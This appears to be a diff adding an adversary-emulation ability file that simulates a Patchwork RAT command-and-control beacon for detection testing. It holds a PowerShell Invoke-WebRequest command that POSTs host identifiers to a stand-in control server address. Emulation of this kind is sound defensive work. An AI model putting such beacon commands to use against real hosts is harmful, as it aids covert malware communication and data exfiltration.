@@ -1,0 +1,36 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: '
+  technique_id: T1071.001
+  name: 'Intrusion: Patchwork RAT variant outbound connection'
+  description: Adversaries may establish command and control (CNC) channels, allowing
+    them to issue commands and request files or other stages from a control server.
+    This indicates that a host (Windows) has been compromised with Patchwork RAT,
+    and the attacker using it to make calls for files, act as a call-home vector for
+    other malware-infected systems, or shuttle traffic back to botnet operators.
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "http://198.18.133.49/filedownload2.php" -Method
+      POST -Headers @{ "Content-Type" = "application/x-www-form-urlencoded" } -Body
+      "uuid=testuuid&user=testuser&atcomp=testatcomp"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: c24814f6-f43a-4635-80ac-254a2d317e0e
